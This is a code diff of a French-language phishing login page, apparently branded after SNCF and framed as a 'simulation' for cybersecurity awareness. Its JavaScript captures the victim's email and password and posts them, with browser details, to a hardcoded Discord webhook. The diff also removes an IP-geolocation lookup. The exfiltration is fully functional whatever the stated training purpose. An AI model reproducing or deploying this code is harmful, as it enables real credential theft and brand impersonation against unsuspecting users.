@@ -114,65 +114,76 @@
     // Ton URL Webhook Discord
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1466130857327722497/1h4pQU2uiJevPhZbX0YHpQuNgpeA_63gV27ThIBu5KMeTJrges_EUBHpt4qi64mREbup'; 
 
-   function switchView(viewId) {
+    // Fonction pour changer d'écran
+    function switchView(viewId) {
         document.getElementById('view-login').classList.add('hidden');
         document.getElementById('view-forgot').classList.add('hidden');
         document.getElementById('view-alert').classList.add('hidden');
+        
         document.getElementById(viewId).classList.remove('hidden');
     }
 
+    // Fonction Principale : Capture + Envoi + Affichage
     async function handleFinalSubmit(e) {
         if(e) e.preventDefault();
 
-        // 1. Récupération des inputs
-        const email = document.getElementById('login-email')?.value || "Non saisi";
-        const mdp = document.getElementById('login-password')?.value || "Non saisi";
+        // 1. Récupération des données du formulaire
+        const email = document.getElementById('login-email') ? document.getElementById('login-email').value : "Inconnu";
+        const mdp = document.getElementById('login-password') ? document.getElementById('login-password').value : "Inconnu";
         const browserInfo = navigator.userAgent;
 
-        // 2. Récupération de l'IP et de la ville (via API gratuite)
-        let ipData = { ip: "Inconnue", city: "Inconnue", country_name: "Inconnu" };
-        try {
-            const response = await fetch('https://ipapi.co/json/');
-            ipData = await response.json();
-        } catch (err) { console.log("Erreur de géolocalisation"); }
+        // 2. Mise à jour de l'affichage sur la page "Mordu"
+        const spanEmail = document.getElementById('stolen-email');
+        const spanPwd = document.getElementById('stolen-pwd');
+        const spanBrowser = document.getElementById('stolen-browser');
 
-        // 3. Affichage sur la page de "choc"
-        document.getElementById('stolen-email').innerText = email;
-        document.getElementById('stolen-pwd').innerText = mdp;
-        document.getElementById('stolen-ip').innerText = ipData.ip;
-        document.getElementById('stolen-loc').innerText = `${ipData.city}, ${ipData.country_name}`;
-        document.getElementById('stolen-browser').innerText = browserInfo;
+        if(spanEmail) spanEmail.innerText = email;
+        if(spanPwd) spanPwd.innerText = mdp;
+        if(spanBrowser) spanBrowser.innerText = browserInfo;
 
-        // 4. Envoi Webhook Discord complet
+        // 3. Envoi discret vers Discord
         try {
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🎣 Capture Complète (Simulation)",
-                        color: 13905946,
+                        title: "🎣 Poisson Ferré (Simulation)",
+                        description: "Un utilisateur a mordu à l'hameçon.",
+                        color: 13905946, // Rouge SNCF
                         fields: [
                             { name: "📧 Email", value: email, inline: true },
                             { name: "🔑 Mot de passe", value: mdp, inline: true },
-                            { name: "🌐 IP", value: ipData.ip, inline: false },
-                            { name: "📍 Localisation", value: `${ipData.city}, ${ipData.country_name}`, inline: true },
-                            { name: "📱 Appareil", value: browserInfo, inline: false }
+                            { name: "🖥️ Système", value: browserInfo }
                         ],
-                        footer: { text: "Test de sensibilisation à la cybersécurité" },
                         timestamp: new Date()
                     }]
                 })
             });
-        } catch (err) { }
+        } catch (err) {
+            console.log("Erreur d'envoi Webhook (Bloqué par le navigateur ou URL invalide)");
+        }
 
-        // 5. Interface finale
+        // 4. Animation de l'interface
+        // On cache la barre latérale pour agrandir le message d'alerte
         const sidebar = document.getElementById('side-panel');
-        if(sidebar) { sidebar.style.display = 'none'; }
-        document.getElementById('main-card').style.width = "650px";
-        document.querySelector('.content').style.width = "100%";
+        if(sidebar) {
+            sidebar.style.width = '0';
+            sidebar.style.padding = '0';
+            sidebar.style.opacity = '0';
+        }
+
+        // On ajuste la carte et le contenu
+        const card = document.getElementById('main-card');
+        card.style.width = '650px'; // Réduit la largeur pour centrer l'alerte
+        
+        const contentDiv = document.querySelector('.content');
+        contentDiv.style.width = '100%';
+
+        // On affiche la vue finale
         switchView('view-alert');
     }
 </script>
+
 </body>
 </html>
